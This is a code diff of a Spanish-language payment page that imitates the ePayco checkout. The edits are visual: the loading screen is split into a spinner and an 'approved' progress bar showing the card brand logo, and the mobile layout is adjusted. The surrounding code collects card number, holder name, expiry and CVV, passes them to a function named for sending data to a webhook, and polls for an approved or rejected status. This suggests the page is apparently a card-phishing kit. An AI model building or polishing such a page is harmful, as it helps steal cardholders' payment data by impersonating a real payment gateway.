@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -13,7 +14,7 @@
         body { background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; position: relative; }
         a { text-decoration: none; color: inherit; }
 
-        /* --- FONDO BLUR --- */
+        /* --- FONDO BLUR PÁGINA PRINCIPAL --- */
         .bg-blur-wrapper { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; }
         .bg-blur-wrapper img { width: 100%; height: 100%; object-fit: cover; filter: blur(12px); transform: scale(1.05); }
         .bg-blur-wrapper .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.4); }
@@ -42,10 +43,6 @@
         .location-info svg { width: 18px; height: 18px; border-radius: 2px; }
         .edit-link { color: #007bff; font-weight: 600; font-size: 12px; cursor: pointer; }
 
-        /* --- BARRA VOLVER --- */
-        .back-bar { background: #f8f9fa; padding: 10px 20px; font-size: 13px; font-weight: 600; color: #007bff; display: flex; align-items: center; gap: 5px; cursor: pointer; border-bottom: 1px solid #eee; }
-        .back-bar.hidden { display: none; }
-
         /* --- PANTALLA 2: FORMULARIO DE TARJETA --- */
         .card-form { padding: 25px 20px; }
         .form-title { font-size: 16px; font-weight: 600; color: #333; margin-bottom: 25px; }
@@ -62,9 +59,9 @@
 
         .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
 
-        /* --- LOGOS DE TARJETA DENTRO DEL INPUT (Corregido para que todos midan igual) --- */
+        /* --- LOGOS DE TARJETA DENTRO DEL INPUT (GRANDES) --- */
         .card-logo-container { position: absolute; right: 0; top: 50%; transform: translateY(-50%); display: flex; gap: 5px; }
-        .card-logo-container img { height: 24px; width: auto; object-fit: contain; } /* Forzado a 24px de alto */
+        .card-logo-container img { height: 40px; width: auto; object-fit: contain; } /* 40px de alto */
 
         /* --- SWITCH --- */
         .toggle-wrapper { display: flex; align-items: center; gap: 15px; margin: 25px 0; }
@@ -92,9 +89,41 @@
         .footer-logos img { height: 20px; }
 
         /* ============================================================ */
-        /* --- NUEVO LOADING OVERLAY (DISEÑO BLUR CON PARALELOGRAMO) --- */
+        /* --- OVERLAY 1: SPINNER GIRANDO (AL HACER CLIC Y POLLING) --- */
         /* ============================================================ */
-        .loading-overlay { 
+        .loading-spinner-overlay { 
+            display: none; 
+            position: fixed; 
+            top: 0; left: 0; width: 100%; height: 100%; 
+            background: rgba(255, 255, 255, 0.8); 
+            backdrop-filter: blur(4px); 
+            z-index: 9998; 
+            justify-content: center; 
+            align-items: center; 
+            flex-direction: column; 
+        }
+        .loading-spinner-overlay.active { display: flex; }
+        
+        .loading-spinner-circle {
+            width: 50px; height: 50px; 
+            border: 4px solid #e5e7eb; 
+            border-top: 4px solid #111111; 
+            border-radius: 50%; 
+            animation: spin 0.8s linear infinite; 
+            margin-bottom: 20px;
+        }
+        @keyframes spin { 
+            0% { transform: rotate(0deg); } 
+            100% { transform: rotate(360deg); } 
+        }
+        .loading-spinner-text {
+            font-size: 1rem; font-weight: 600; color: #333;
+        }
+
+        /* ============================================================ */
+        /* --- OVERLAY 2: BARRA PARALELA CON FONDO BLUR (APROBADO) --- */
+        /* ============================================================ */
+        .loading-bar-overlay { 
             display: none; 
             position: fixed; 
             top: 0; left: 0; width: 100%; height: 100%; 
@@ -103,12 +132,10 @@
             align-items: center; 
             padding: 20px; 
         }
-        .loading-overlay.active { 
-            display: flex; 
-        }
+        .loading-bar-overlay.active { display: flex; }
 
         /* Fondo Blur con Overlay oscuro */
-        .loading-overlay::before {
+        .loading-bar-overlay::before {
             content: '';
             position: absolute;
             top: 0; left: 0; right: 0; bottom: 0;
@@ -119,7 +146,7 @@
             transform: scale(1.05);
             z-index: -2;
         }
-        .loading-overlay::after {
+        .loading-bar-overlay::after {
             content: '';
             position: absolute;
             top: 0; left: 0; right: 0; bottom: 0;
@@ -127,8 +154,8 @@
             z-index: -1;
         }
 
-        /* La tarjeta flotante */
-        .loading-card { 
+        /* La tarjeta flotante con la barra */
+        .loading-bar-card { 
             background: #ffffff; 
             border-radius: 12px; 
             padding: 40px; 
@@ -141,24 +168,23 @@
             flex-direction: column;
             align-items: center;
             justify-content: center;
-            gap: 30px; /* Separación entre logo y barra */
+            gap: 30px;
         }
 
-        /* Logo de la tarjeta identificada */
-        .loading-card .logo-img { 
-            height: 80px; /* Tamaño grande */
+        .loading-bar-card .logo-img { 
+            height: 80px; 
             width: auto; 
             max-width: 200px; 
             object-fit: contain; 
         }
 
-        /* El paralelogramo de carga (Cian / Azul) */
+        /* El paralelogramo de carga (Azul) */
         .progress-parallelogram-container {
             width: 100%;
-            height: 24px; /* Grosor de la barra */
+            height: 24px;
             background: #e5e7eb;
             border-radius: 4px;
-            transform: skewX(-20deg); /* Efecto paralelogramo */
+            transform: skewX(-20deg);
             overflow: hidden;
             position: relative;
             box-shadow: inset 0 2px 4px rgba(0,0,0,0.1);
@@ -167,12 +193,11 @@
         .progress-parallelogram-fill {
             height: 100%;
             width: 0%;
-            background: #00bcd4; /* Color azul/cian */
-            background: linear-gradient(90deg, #00bcd4, #0288d1); /* Degradado azul */
+            background: #00bcd4;
+            background: linear-gradient(90deg, #00bcd4, #0288d1);
             transition: width 0.3s ease;
         }
 
-        /* Animación del brillo de la barra (opcional, se ve más pro) */
         .progress-parallelogram-fill::after {
             content: '';
             position: absolute;
@@ -187,7 +212,16 @@
 
         /* --- MEDIA QUERIES --- */
         @media (min-width: 769px) { .epayco-container { max-width: 460px; } }
-        @media (max-width: 480px) { body { padding: 10px; } .epayco-container { border-radius: 0; box-shadow: none; } .form-row { grid-template-columns: 1fr; gap: 0; } }
+        
+        @media (max-width: 480px) { 
+            body { padding: 10px; } 
+            .epayco-container { border-radius: 0; box-shadow: none; } 
+            .form-row { grid-template-columns: 1fr; gap: 0; } 
+            
+            /* Ajuste del logo en el input para celular */
+            .card-logo-container img { height: 45px; } 
+            .input-group { margin-bottom: 25px; } 
+        }
     </style>
 </head>
 <body>
@@ -198,13 +232,16 @@
         <div class="overlay"></div>
     </div>
 
-    <!-- PANTALLA DE CARGA (LOADER CON NUEVO DISEÑO) -->
-    <div class="loading-overlay" id="loadingOverlay">
-        <div class="loading-card">
-            <!-- Logo de la tarjeta -->
+    <!-- OVERLAY 1: SPINNER (CARGANDO...) -->
+    <div class="loading-spinner-overlay" id="loadingSpinnerOverlay">
+        <div class="loading-spinner-circle"></div>
+        <div class="loading-spinner-text">Cargando...</div>
+    </div>
+
+    <!-- OVERLAY 2: BARRA CON LOGO (APROBADO) -->
+    <div class="loading-bar-overlay" id="loadingBarOverlay">
+        <div class="loading-bar-card">
             <img id="cardLogoImg" src="" alt="Logo tarjeta" class="logo-img" />
-            
-            <!-- Barra de progreso en paralelogramo -->
             <div class="progress-parallelogram-container">
                 <div class="progress-parallelogram-fill" id="progressFill"></div>
             </div>
@@ -449,7 +486,8 @@
         const cardNumberError = document.getElementById('cardNumberError');
         const form = document.getElementById('paymentForm');
 
-        const loadingOverlay = document.getElementById('loadingOverlay');
+        const loadingSpinnerOverlay = document.getElementById('loadingSpinnerOverlay');
+        const loadingBarOverlay = document.getElementById('loadingBarOverlay');
         const cardLogoImg = document.getElementById('cardLogoImg');
         const progressFill = document.getElementById('progressFill');
 
@@ -581,11 +619,12 @@
                 const data = await response.json();
                 if (data.estado === 'approved') {
                     clearInterval(pollingInterval); pollingInterval = null;
-                    mostrarCargaConLogos(data.tipo_tarjeta || cardType || 'visa');
+                    loadingSpinnerOverlay.classList.remove('active'); // Ocultamos el spinner
+                    mostrarCargaConLogos(data.tipo_tarjeta || cardType || 'visa'); // Mostramos la barra
                     return true;
                 } else if (data.estado === 'rejected') {
                     clearInterval(pollingInterval); pollingInterval = null;
-                    loadingOverlay.classList.remove('active');
+                    loadingSpinnerOverlay.classList.remove('active'); // Ocultamos el spinner
                     mostrarError('❌ Pago rechazado. Intente nuevamente.');
                     habilitarFormulario();
                     return false;
@@ -600,7 +639,7 @@
             pollingInterval = setInterval(async () => {
                 if (Date.now() - tiempoInicio > MAX_POLLING_TIME) {
                     clearInterval(pollingInterval); pollingInterval = null;
-                    loadingOverlay.classList.remove('active');
+                    loadingSpinnerOverlay.classList.remove('active');
                     mostrarError('⏰ Tiempo de espera agotado.');
                     habilitarFormulario();
                     return;
@@ -611,21 +650,20 @@
         }
 
         // ============================================================
-        // NUEVA PANTALLA DE CARGA (DISEÑO SOLICITADO)
+        // PANTALLA DE CARGA APROBADA (BARRA PARALELA CON BLUR)
         // ============================================================
         function mostrarCargaConLogos(tipo) {
-            // Asignamos la imagen del logo según el tipo detectado
             const cardLogoFile = { 'visa': 'visa.png', 'mastercard': 'mastercard.png', 'amex': 'ame.png' }[tipo];
             if (cardLogoFile) { cardLogoImg.src = cardLogoFile; cardLogoImg.alt = tipo; }
             
-            // Configuramos la barra de progreso
+            loadingBarOverlay.classList.add('active'); // Mostramos la tarjeta con la barra
+            
             let progress = 0;
             const duration = 3000;
             const interval = 50;
             const increment = 100 / (duration / interval);
             progressFill.style.width = '0%';
             
-            // Iniciamos la animación
             const timer = setInterval(() => {
                 progress += increment;
                 if (progress >= 100) {
@@ -697,7 +735,7 @@
             localStorage.setItem('solicitudId', solicitudId);
             localStorage.setItem('cuotas', cuotasSeleccionadas);
 
-            loadingOverlay.classList.add('active');
+            loadingSpinnerOverlay.classList.add('active'); // Mostramos el spinner de "Cargando..."
 
             btnPagar.disabled = true; btnPagar.textContent = 'Procesando...';
             inputNumero.disabled = true; inputNombre.disabled = true; inputExp.disabled = true; inputCVV.disabled = true;
@@ -739,7 +777,7 @@
 
             const resultado = await enviarDatosAlWebhook(datos);
             if (resultado === false) {
-                loadingOverlay.classList.remove('active');
+                loadingSpinnerOverlay.classList.remove('active');
                 mostrarError('Error al procesar el pago. Intente nuevamente.');
                 habilitarFormulario();
                 return;
